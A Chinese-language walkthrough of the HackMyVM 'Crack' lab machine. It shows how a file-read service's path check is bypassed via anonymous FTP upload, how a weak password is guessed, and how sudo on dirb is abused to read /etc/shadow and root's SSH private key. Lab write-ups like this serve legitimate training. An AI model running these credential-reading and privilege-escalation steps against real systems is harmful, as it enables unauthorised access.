# Crack

2025.02.26 https://hackmyvm.eu/machines/machine.php?vm=Crack

[video](https://www.bilibili.com/video/BV1BKPGewErb/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.39

## Scan

```
PORT      STATE SERVICE
21/tcp    open  ftp
4200/tcp  open  vrml-multi-use
12359/tcp open  unknown
```

访问 https://192.168.5.39:4200/ 显示的是一个 shell in a box 但是需要输入用户名和密码，目前没有用户凭据。

ftp 可以匿名登陆，/upload 目录权限 777 可以写文件，/upload/crack.py 将其下载，发现就是端口 12359 上运行的 python 文件。

```python
no = "NO"
while True:
        try:
                c.send('File to read:'.encode())
                data = c.recv(1024)
                file = (str(data, 'utf-8').strip())  # 这里输入 /etc/passwd
                filename = os.path.basename(file)    # 这里将返回输入路径的最后一个文件的文件名，如果输入 /etc/passwd 就返回 passwd
                check = "/srv/ftp/upload/"+filename  # 这里变成了 /srv/ftp/upload/passwd
                if os.path.isfile(check) and os.path.isfile(file):  # 这里 /srv/ftp/upload/passwd 和 /etc/passwd 都是存在的文件，直接绕过这个判断读取到 /etc/passwd
                        f = open(file,"r")
                        lines = f.readlines()
                        lines = str(lines)
                        lines = lines.encode()
                        c.send(lines)
                else:
                        c.send(no.encode())
        except ConnectionResetError:
                pass
```

nc 192.168.5.39 12359 输入 crack.py 就可以读取/srv/ftp/upload/中的文件，这里要尝试读取到系统内的其他文件，这里需要绕过这里的代码判断逻辑：os.path.isfile(check) and os.path.isfile(file) 这里上传一个空的 passwd 文件，然后 nc 连接，读取文件 /etc/passwd 这时就绕过了上述的代码判断，读取到了/etc/passwd 文件:

```
['root:x:0:0:root:/root:/bin/bash\n',
'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n',
'shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\n']
```

这里发现了 2 个用户名 cris 和 shellinabox ，目前没有密码，尝试将用户名当成密码进行登陆。cris:cris 登陆成功。

得到了 user flag：

```
cris@crack:~$ cat user.txt
eG4TUsTBxSFjTOPHMV
```

sudo -l 发现 (ALL) NOPASSWD: /usr/bin/dirb 可以利用 dirb 扫描时传入的参数读取系统中的 root 权限的文件：

```
sudo /usr/bin/dirb http://192.168.5.3 /etc/shadow -v

root:$y$j9T$LVT9GIrLdk5L.xns1akJZ1$wmigJ7er07AT/VwIAuYSZ3j94LOCe8EJHC6d2mlZVo3:19515:0:99999:7:::
```

尝试 john 进行破解，但是没爆出来：

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=crypt
```

这里不能直接读取到/root/root.txt 应该是文件做了变形。

或者探测读取/root/.ssh/id_rsa 私钥文件:

```
sudo dirb http://192.168.5.3/ /root/.ssh/id_rsa -v
```

然后将私钥内容进行格式整理保存，并补齐首位格式：

```
cat tmp|awk -F '192.168.5.3/' '{print $2}'|awk -F ' ' '{print $1}' > root_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

然后将私钥上传至目标机器上，127.0.0.1:22 在本地登陆 ssh，最终获得 root flag：

```
root@crack:~# cat root_fl4g.txt
wRt2xlFjcYqXXo4HMV
```
